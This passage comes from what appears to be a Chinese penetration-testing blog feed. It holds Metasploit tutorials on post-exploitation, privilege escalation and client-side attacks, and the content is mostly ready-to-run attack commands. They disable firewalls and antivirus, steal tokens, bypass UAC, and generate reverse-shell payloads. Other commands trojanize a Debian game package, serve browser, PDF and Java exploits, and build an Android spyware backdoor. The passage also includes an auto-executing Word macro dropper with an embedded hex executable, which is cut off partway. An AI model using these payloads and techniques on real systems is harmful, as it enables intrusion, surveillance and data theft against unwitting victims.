&#x2F;f</span><br></pre></td></tr></table></figure></li><li><p><strong>关闭防火墙</strong></p><ul><li>需要管理员或system权限</li><li><code>shell</code></li><li><code>netsh advfirewall set allprofiles state off</code></li></ul></li><li><p><strong>关闭Windefend</strong> (win10自带防护)</p><ul><li><code>net stop windefend</code></li></ul></li><li><p><strong>Bitlocker 磁盘加密</strong></p><ul><li><code>manage-bde -off C:</code></li><li><code>manage-bde -status C:</code></li></ul></li><li><p><strong>关闭 DEP</strong> (数据执行保护)</p><ul><li><code>bcdedit.exe /set {current} nx AlwaysOff</code></li></ul></li><li><p><strong>杀死防病毒软件</strong></p><ul><li><strong>meterpreter</strong></li><li><code>run killav</code></li><li><code>run post/windows/manage/killav</code></li></ul></li><li><p><strong>开启远程桌面服务</strong></p><ul><li><strong>meterpreter</strong></li><li><code>run post/windows/manage/enable_rdp</code>        开启远程</li><li><code>run multi_console_command -rc /root/.*.txt</code>        关闭远程</li><li><code>run getgui –e</code><ul><li><code>run getgui -u owl -p 12313</code>        #添加一条远程账号组的账号</li><li><code>run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20160824.1855.rc</code></li></ul></li></ul></li><li><p><strong>查看远程桌面</strong></p><ul><li>screenshot    #屏幕截图</li><li>use espia    #加载截图插件<ul><li>screengrab    #屏幕截图</li></ul></li></ul></li></ul><h4 id="Tokens-插件"><a href="#Tokens-插件" class="headerlink" title="Tokens 插件"></a><strong>Tokens</strong> 插件</h4><ul><li><p>用户每次登录,账号绑定临时的token</p></li><li><p>访问资源时提交token进行身份验证,类似于WEB Cookie</p></li><li><p>Delegate Token: 交互登录会话</p></li><li><p>Impersonate Token: 非交互登录会话</p></li><li><p>Delegate Token账号注销后变为Impersonate Token,权限依然有效</p></li><li><p><strong>Incognito</strong></p><ul><li>独立功能的软件,被MSF集成在meterpreter中</li><li>无需密码破解或获取密码HASH,窃取Token将自己伪装成其他用户</li><li>尤其适用于域环境下提权渗透多操作系统</li></ul></li></ul><p><strong>搭建域环境</strong></p><ul><li><p>dcpromo Win03 + XP</p></li><li><p>XP DNS指向03域服务器IP</p></li><li><p><code>load incognito</code></p><ul><li><p><code>list_tokens -u</code>    #查看token列表</p></li><li><p><code>impersonate_token lab\\administrator</code> #伪装域管理员token</p></li><li><p>运行以上命令需要getsystem</p><ul><li><p>本地普通权限用户需先本地提权</p></li><li><p><code>use exploit/windows/local/ms10_015_kitrap0d</code></p><ul><li><code>show options</code></li><li><code>set session 1</code></li><li><code>set lhost 192.168.190.137</code></li><li><code>set payload windows/meterpreter/reverse_tcp</code></li><li><code>exploit -j</code></li></ul></li><li><p><code>execute -f cmd.exe -i -t</code>    # -t:使用当前假冒token执行程序</p></li><li><p><code>shell</code> </p></li></ul></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;meterpreter&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;load priv
hashdump&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&quot;Psexec-模块之Passthehash&quot;&gt;&lt;a href=&quot;#Psexec-模块之Passthehash
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞利用" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
      <category term="MSF" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/MSF/"/>
    
    
      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
    
      <category term="提权" scheme="http://c.cat.plus/tags/%E6%8F%90%E6%9D%83/"/>
    
      <category term="hashdump" scheme="http://c.cat.plus/tags/hashdump/"/>
    
      <category term="incognito" scheme="http://c.cat.plus/tags/incognito/"/>
    
      <category term="token窃取" scheme="http://c.cat.plus/tags/token%E7%AA%83%E5%8F%96/"/>
    
  </entry>
  
  <entry>
    <title>MsF后渗透测试阶段之提权</title>
    <link href="http://c.cat.plus/2016/03/10/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8B%E6%8F%90%E6%9D%83/"/>
    <id>http://c.cat.plus/2016/03/10/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8B%E6%8F%90%E6%9D%83/</id>
    <published>2016-03-10T13:51:53.000Z</published>
    <updated>2020-07-04T13:13:56.788Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p>已经获得目标系统控制权后扩大站果</p><ul><li>提权</li><li>信息收集</li><li>渗透内网</li><li>后门持久化</li></ul></li><li><p>基于已有session扩大站果</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;1.1.1.1 LPORT&#x3D;4444 -b &quot;\x00&quot; -e x86&#x2F;shikata_ga_nai -f exe -o 1.exe</span><br></pre></td></tr></table></figure></li></ul><h4 id="获取system账号权限"><a href="#获取system账号权限" class="headerlink" title="获取system账号权限"></a><strong>获取system账号权限</strong></h4><p><strong>meterpreter</strong></p><pre><code>load privgetsystempriv_elevate_getsystem: Operation failed: Access is denied.</code></pre><ul><li>使用 <code>exploit/windows/local</code>下的模块 <strong>绕过UAC限制</strong> 进行getsystem提权  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#发起弹窗询问UAC权限赋予</span><br><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;ask</span><br><span class="line">info</span><br><span class="line">show options</span><br><span class="line">set session 1</span><br><span class="line">set filename up_data.exe</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 192.168.190.176</span><br><span class="line">exploit -j#执行后获取一个新的能getsystem的session</span><br><span class="line"></span><br><span class="line">#直接绕过UAC</span><br><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac</span><br><span class="line">info</span><br><span class="line">show options</span><br><span class="line">set session 1</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 192.168.190.176</span><br><span class="line">exploit -j#执行后获取一个新的能getsystem的session</span><br><span class="line"></span><br><span class="line">#注入dll动态链接库文件,绕过UAC</span><br><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection</span><br><span class="line">set session</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 192.168.190.176</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure></li></ul><h4 id="利用漏洞直接提权为-system"><a href="#利用漏洞直接提权为-system" class="headerlink" title="利用漏洞直接提权为 system"></a><strong>利用漏洞直接提权为 system</strong></h4><pre><code>#利用本地已有漏洞直接提权为SYSTEMuse exploit/windows/local/ms13_053_schlampereiinfoset payload windows/meterpreter/reverse_tcpset lhost 192.168.190.176set session 1show optionsexploit -juse exploit/windows/local/ms13_081_track_popup_menuinfoset payload windows/meterpreter/reverse_tcpset lhost 192.168.190.176set session 1show optionsexploit -juse exploit/windows/local/ms13_097_ie_registry_symlinkinfoset session 1set payload windows/meterpreter/reverse_tcpset lhost 192.168.190.176show optionsexploit -juse exploit/windows/local/ppr_flatten_recinfoset payload windows/meterpreter/reverse_tcpset lhost 192.168.190.176set session 1show optionsexploit -j</code></pre><p><strong>图形化payload</strong></p><pre><code>#利用VNC注入模块获取图形化payloadset payload windows/vncinject/reverse_tcpshow optionsset session 1set lhost 192.168.190.176set viewonly no        #可操作</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ul&gt;
&lt;li&gt;&lt;p&gt;已经获得目标系统控制权后扩大站果&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;提权&lt;/li&gt;
&lt;li&gt;信息收集&lt;/li&gt;
&lt;li&gt;渗透内网&lt;/li&gt;
&lt;li&gt;后门持久化&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;基于已有session扩大站果&lt;/p&gt;
  &lt;figur
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞利用" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
      <category term="MSF" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/MSF/"/>
    
    
      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
    
      <category term="提权" scheme="http://c.cat.plus/tags/%E6%8F%90%E6%9D%83/"/>
    
      <category term="内网渗透" scheme="http://c.cat.plus/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="后门持久化" scheme="http://c.cat.plus/tags/%E5%90%8E%E9%97%A8%E6%8C%81%E4%B9%85%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>MsF客户端渗透</title>
    <link href="http://c.cat.plus/2016/03/09/Exploits/MsF/MsF%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/"/>
    <id>http://c.cat.plus/2016/03/09/Exploits/MsF/MsF%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/</id>
    <published>2016-03-09T11:31:13.000Z</published>
    <updated>2020-07-04T06:15:05.486Z</updated>
    
    <content type="html"><![CDATA[<p><strong>在无法突破网络边界的情况下转而攻击客户端</strong></p><ul><li>社会工程学攻击</li><li>进而渗透线上业务网络</li></ul><p><strong>含有漏洞利用代码的WEB站点</strong></p><ul><li>利用客户端漏洞</li></ul><p><strong>含有漏洞利用代码的DOC,PDF等文档</strong></p><ul><li>诱骗被害者执行payload</li></ul><h4 id="诱骗被害者执行Payload-windows"><a href="#诱骗被害者执行Payload-windows" class="headerlink" title="诱骗被害者执行Payload(windows)"></a><strong>诱骗被害者执行Payload(windows)</strong></h4><p><strong>查看反弹连接的payload选项</strong></p><pre><code>msfvenom --list-options -p windows/shell/reverse_tcp</code></pre><p><strong>使用msfvenom生成Payload</strong></p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; -f exe -o payload.exe</code></pre><p><strong>使用msfvenom加编码生成Payload</strong></p><pre><code>msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=1.1.1.1 LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f exe -o cat.exe</code></pre><p><strong>利用msf监听反弹连接</strong>    </p><pre><code>msfdb runuse exploit/multi/handlerset payload windows/shell/reverse_tcpset LHOST 1.1.1.1set LPORT 4444exploit</code></pre><h4 id="诱骗被害者执行Payload-Linux-Deb安装包"><a href="#诱骗被害者执行Payload-Linux-Deb安装包" class="headerlink" title="诱骗被害者执行Payload(Linux Deb安装包)"></a><strong>诱骗被害者执行Payload(Linux Deb安装包)</strong></h4><p><strong>apt-get只下载deb包不安装</strong></p><pre><code>apt-get --download-only install freesweep    </code></pre><p><strong>dpkg -x 解包到free文件夹</strong></p><pre><code>dpkg -x freesweep_0.90-1_i386.deb free        </code></pre><p><strong>创建DEBIAN文件夹然后进入文件夹</strong></p><pre><code>mkdir free/DEBIAN &amp;&amp; cd free/DEBIAN</code></pre><p><code>vi control</code> <strong>写入以下内容</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Package: freesweep</span><br><span class="line">Version: 0.90-3</span><br><span class="line">Section: optional</span><br><span class="line">Architecture: i386</span><br><span class="line">Maintainer: Ubuntu MOTU Developers (ubuntu-motu@lists.ubuntu.com)</span><br><span class="line">Description: a text-based minesweeper</span><br><span class="line">Freesweep is an implementation of the popular minesweeper game,where one tries to find all the mines without igniting any,based on hints given by the computer.Unlike most implementations of this game,Freesweep works in any visual text display - in linux console,in an xterm,and in most text-based terminals currently in use.</span><br><span class="line">postinst;</span><br></pre></td></tr></table></figure><p><code>vi postinst</code> <strong>写入以下脚本</strong></p><pre><code>#!/bin/sh#赋予执行权限并执行Payload并执行它,再执行正常程序sudo chmod 2755 /usr/games/freesweep_scores &amp;&amp; /usr/games/freesweep_scores &amp; /usr/games/freesweep &amp;chmod 755 postinst</code></pre><p><strong>生成Payload到该目录</strong></p><pre><code>msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=1.1.1.1 LPORT=4444 -b &quot;\x00&quot; -f elf -o /root/free/usr/games/freesweep_scores</code></pre><p><strong>打包deb</strong></p><pre><code>dpkg-deb --build /root/free</code></pre><h4 id="利用PDF阅读器漏洞执行payload"><a href="#利用PDF阅读器漏洞执行payload" class="headerlink" title="利用PDF阅读器漏洞执行payload"></a><strong>利用PDF阅读器漏洞执行payload</strong></h4><ul><li><p><strong>利用Acrobat Reader</strong></p></li><li><p>MsF构造PDF文件利用模块:</p><ul><li><p><code>use exploit/windows/fileformat/adobe_utilprintf</code></p><ul><li><code>set payload windows/meterpreter/reverse_tcp</code></li><li><code>set lhost 192.168.254.111</code></li><li><code>show options</code></li><li><code>exploit</code>        #生成包含payload的PDF文档</li></ul></li><li><p><code>use exploit/multi/handler</code></p><ul><li><code>set payload windows/meterpreter/reverse_tcp</code></li><li><code>set lhost 192.168.254.111</code></li><li><code>exploit -j</code></li></ul></li></ul></li></ul><ul><li><p>MsF构造恶意网站模块:</p><ul><li><p><code>use exploit/windows/browser/adobe_utilprintf</code></p><ul><li><code>show options</code></li><li><code>set SRVPORT 80</code>    #设置服务端口</li><li><code>set URIPATH /</code>    #设置web根路径</li><li><code>set payload windows/meterpreter/reverse_tcp</code>        #设置payload</li><li><code>set lhost 192.168.254.175</code></li><li><code>exploit -j</code></li></ul></li><li><p><strong>Meterpreter</strong></p><ul><li><code>use priv</code>        #本地提权</li><li><code>run post/windows/capture/keylog_recorder</code></li></ul></li></ul></li></ul><h4 id="利用Flash插件漏洞执行payload"><a href="#利用Flash插件漏洞执行payload" class="headerlink" title="利用Flash插件漏洞执行payload"></a><strong>利用Flash插件漏洞执行payload</strong></h4><ul><li><p><code>adobe_flash_hacking_team_uaf</code>利用模块由Hacking Team 2015年被泄露后,录入MSF</p><ul><li><code>use exploit/multi/browser/adobe_flash_hacking_team_uaf</code><ul><li><code>info</code></li><li><code>show options</code></li><li><code>set SRVPORT 80</code></li><li><code>set URIPATH /</code></li><li><code>set payload windows/meterpreter/reverse_tcp</code></li><li><code>set lhost 192.168.1.11</code></li><li><code>show targets</code></li><li><code>exploit</code></li></ul></li></ul></li><li><p><code>adobe_flash_opaque_background_uaf</code>利用模块也是由Hacking Team 2015年被泄露后,录入MSF        </p><ul><li><code>use exploit/multi/browser/adobe_flash_opaque_background_uaf</code><ul><li><code>show options</code></li><li><code>set SRVPORT 80</code></li><li><code>set URIPATH /</code></li><li><code>set payload windows/meterpreter/reverse_tcp</code></li><li><code>set lhost 192.168.1.11</code></li><li><code>show targets</code></li><li><code>exploit</code>    </li></ul></li></ul></li><li><p><code>browser_autopwn2</code>辅助模块可以把MSF里质量较好的所有浏览器漏洞利用模块统一启动起来</p><ul><li><code>use auxiliary/server/browser_autopwn2</code><ul><li><code>show options</code></li><li><code>set SRVPORT 80</code></li><li><code>set URIPATH /</code></li><li><code>exploit</code></li></ul></li></ul></li></ul><h4 id="利用IE浏览器漏洞执行payload"><a href="#利用IE浏览器漏洞执行payload" class="headerlink" title="利用IE浏览器漏洞执行payload"></a><strong>利用IE浏览器漏洞执行payload</strong></h4><pre><code>use exploit/windows/browser/Display all 246 possibilities? (y or n)        #MSF收录的浏览器漏洞利用模块目前有240+#使用ms14_064_ole_code_execution模块use exploit/windows/browser/ms14_064_ole_code_executioninfoshow optionsset SRVPORT 80set URIPATH /show targets        #针对Win xp 和 win7默认IE有效exploit</code></pre><h4 id="浏览器利用JRE漏洞执行payload"><a href="#浏览器利用JRE漏洞执行payload" class="headerlink" title="浏览器利用JRE漏洞执行payload"></a><strong>浏览器利用JRE漏洞执行payload</strong></h4><pre><code>#对java_jre1.7版本有效use exploit/multi/browser/java_jre17_driver_managershow optionsset SRVPORT 80set URIPATH /set payload java/meterpreter/reverse_tcpset lhost 192.168.190.175exploit#java_jre17_jmxbean模块use exploit/multi/browser/java_jre17_jmxbeanshow optionsset SRVPORT 80set URIPATH /set payload java/meterpreter/reverse_tcpset lhost 192.168.190.175exploit    #java_jre17_reflection_types模块use exploit/multi/browser/java_jre17_reflection_typesshow optionsset SRVPORT 80set URIPATH /set payload java/meterpreter/reverse_tcpset lhost 192.168.190.175exploit    </code></pre><h4 id="生成Android后门"><a href="#生成Android后门" class="headerlink" title="生成Android后门"></a><strong>生成Android后门</strong></h4><pre><code>msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.2.146 LPORT=4444 R &gt; payload.apkuse exploit/multi/handlerset PAYLOAD android/meterpreter/reverse_tcpset LHOST 192.168.190.175exploit -jsearch     #搜索文件，命令：search text.jpgdownload #下载文件，命令：download test.jpgwebcam_list #查看摄像头列表，因为手机都是前置和后置摄像头了webcam_snap #拍照一张，需要选用前置或者后置摄像头，命令：webcam_snap -i 1webcam_stream #开启摄像头视频监控，同上，命令：webcam_stream -i 1安卓系统相关命令：check_root #查看当前安卓是否已经rootdump_calllog #下载通话记录dump_contacts #下载短信记录dump_sms #下载通讯录geolocate #利用谷歌地图定位（需要安装谷歌地图）</code></pre><h4 id="VBScript感染方式"><a href="#VBScript感染方式" class="headerlink" title="VBScript感染方式"></a><strong>VBScript感染方式</strong></h4><ul><li><p>利用宏感染word,excel文档</p></li><li><p>绕过某些基于文件类型检查的安全机制</p></li><li><p><strong>生成VBScript脚本</strong>:</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;1.1.1.1 LPORT&#x3D;4444 -e x86&#x2F;shikata_ga_nai -f vba-exe</span><br></pre></td></tr></table></figure></li><li><p><strong>Office 2007 +</strong></p><ul><li><strong>视图–宏–创建</strong></li><li><strong>Payload第一部分粘入VBA代码</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">Sub Auto_Open()</span><br><span class="line">Glwsj12</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub Glwsj12()</span><br><span class="line">Dim Glwsj7 As Integer</span><br><span class="line">Dim Glwsj1 As String</span><br><span class="line">Dim Glwsj2 As String</span><br><span class="line">Dim Glwsj3 As Integer</span><br><span class="line">Dim Glwsj4 As Paragraph</span><br><span class="line">Dim Glwsj8 As Integer</span><br><span class="line">Dim Glwsj9 As Boolean</span><br><span class="line">Dim Glwsj5 As Integer</span><br><span class="line">Dim Glwsj11 As String</span><br><span class="line">Dim Glwsj6 As Byte</span><br><span class="line">Dim Gpxyxbdwpa as String</span><br><span class="line">Gpxyxbdwpa &#x3D; &quot;Gpxyxbdwpa&quot;</span><br><span class="line">Glwsj1 &#x3D; &quot;SWQeAqOHq.exe&quot;</span><br><span class="line">Glwsj2 &#x3D; Environ(&quot;USERPROFILE&quot;)</span><br><span class="line">ChDrive (Glwsj2)</span><br><span class="line">ChDir (Glwsj2)</span><br><span class="line">Glwsj3 &#x3D; FreeFile()</span><br><span class="line">Open Glwsj1 For Binary As Glwsj3</span><br><span class="line">For Each Glwsj4 in ActiveDocument.Paragraphs</span><br><span class="line">DoEvents</span><br><span class="line">Glwsj11 &#x3D; Glwsj4.Range.Text</span><br><span class="line">If (Glwsj9 &#x3D; True) Then</span><br><span class="line">Glwsj8 &#x3D; 1</span><br><span class="line">While (Glwsj8 &lt; Len(Glwsj11))</span><br><span class="line">Glwsj6 &#x3D; Mid(Glwsj11,Glwsj8,4)</span><br><span class="line">Put #Glwsj3, , Glwsj6</span><br><span class="line">Glwsj8 &#x3D; Glwsj8 + 4</span><br><span class="line">Wend</span><br><span class="line">ElseIf (InStr(1,Glwsj11,Gpxyxbdwpa) &gt; 0 And Len(Glwsj11) &gt; 0) Then</span><br><span class="line">Glwsj9 &#x3D; True</span><br><span class="line">End If</span><br><span class="line">Next</span><br><span class="line">Close #Glwsj3</span><br><span class="line">Glwsj13(Glwsj1)</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub Glwsj13(Glwsj10 As String)</span><br><span class="line">Dim Glwsj7 As Integer</span><br><span class="line">Dim Glwsj2 As String</span><br><span class="line">Glwsj2 &#x3D; Environ(&quot;USERPROFILE&quot;)</span><br><span class="line">ChDrive (Glwsj2)</span><br><span class="line">ChDir (Glwsj2)</span><br><span class="line">Glwsj7 &#x3D; Shell(Glwsj10, vbHide)</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub AutoOpen()</span><br><span class="line">Auto_Open</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub Workbook_Open()</span><br><span class="line">Auto_Open</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure></li><li><strong>Paylaod第二部分粘入word文档正文</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Gpxyxbdwpa</span><br><span class="line">&amp;H4D&amp;H5A&amp;H90&amp;H00&amp;H03&amp;H00&amp;H00&amp;H00&amp;H04&amp;H00&amp;H00&amp;H00&amp;HFF&amp;HFF&amp;H00&amp;H00&amp;HB8&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H40&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H80&amp;H00&amp;H00&amp;H00&amp;H0E&amp;H1F&amp;HBA&amp;H0E&amp;H00&amp;HB4&amp;H09&amp;HCD&amp;H21&amp;HB8&amp;H01&amp;H4C&amp;HCD&amp;H21&amp;H54&amp;H68&amp;H69&amp;H73&amp;H20&amp;H70&amp;H72&amp;H6F&amp;H67&amp;H72&amp;H61&amp;H6D&amp;H20&amp;H63&amp;H61&amp;H6E&amp;H6E&amp;H6F&amp;H74&amp;H20&amp;H62&amp;H65&amp;H20&amp;H72&amp;H75&amp;H6E&amp;H20&amp;H69&amp;H6E&amp;H20&amp;H44&amp;H4F&amp;H53&amp;H20&amp;H6D&amp;H6F&amp;H64&amp;H65&amp;H2E&amp;H0D&amp;H0D&amp;H0A&amp;H24&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H50&amp;H45&amp;H00&amp;H00&amp;H4C&amp;H01&amp;H03&amp;H00&amp;H80&amp;H8B&amp;H40&amp;H38&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;HE0&amp;H00&amp;H0F&amp;H03&amp;H0B&amp;H01&amp;H02&amp;H38&amp;H00&amp;H02&amp;H00&amp;H00&amp;H00&amp;H0E&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H10&amp;H00&amp;H00&amp;H00&amp;H10&amp;H00&amp;H00&amp;H00&amp;H20&amp;H00&amp;H00&amp;H00&amp;H00&amp;H40&amp;H00&amp;H00&amp;H10&amp;H00&amp;H00&amp;H00&amp;H02&amp;H00&amp;H00&amp;H04&amp;H00&amp;H00&amp;H00&amp;H01&amp;H00&amp;H00&amp;H00&amp;H04&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H40&amp;H00&amp;H00&amp;H00&amp;H02&amp;H00&amp;H00&amp;H46&amp;H3A&amp;H00&amp;H00&amp;H02&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H20&amp;H00&amp;H00&amp;H10&amp;H00&amp;H00&amp;H00&amp;H00&amp;H10&amp;H00&amp;H00&amp;H10&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H10&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H30&amp;H00&amp;H00&amp;H64&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H2E&amp;H74&amp;H65&amp;H78&amp;H74&amp;H00&amp;H00&amp;H00&amp;H28&amp;H00&amp;H00&amp;H00&amp;H00&amp;H10&amp;H00&amp;H00&amp;H00&amp;H02&amp;H00&amp;H00&amp;H00&amp;H02&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H20&amp;H00&amp;H30&amp;H60&amp;H2E&amp;H64&amp;H61&amp;H74&amp;H61&amp;H00&amp;H00&amp;H00&amp;H90&amp;H0A&amp;H00&amp;H00&amp;H00&amp;H20&amp;H00&amp;H00&amp;H00&amp;H0C&amp;H00&amp;H00&amp;H00&amp;H04&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H20&amp;H00&amp;H30&amp;HE0&amp;H2E&amp;H69&amp;H64&amp;H61&amp;H74&amp;H61&amp;H00&amp;H00&amp;H64&amp;H00&amp;H00&amp;H00&amp;H00&amp;H30&amp;H00&amp;H00&amp;H00&amp;H02&amp;H00&amp;H00&amp;H00&amp;H10&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H